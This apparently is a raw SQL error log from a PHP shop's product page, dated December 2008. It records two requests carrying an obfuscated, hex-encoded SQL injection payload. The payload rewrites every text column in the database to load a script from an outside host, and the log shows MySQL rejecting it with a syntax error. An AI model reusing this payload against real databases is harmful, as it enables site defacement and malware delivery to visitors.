+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+update tblProduct set p_view = p_view + 1 where p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 1
+===========================================================================================
+
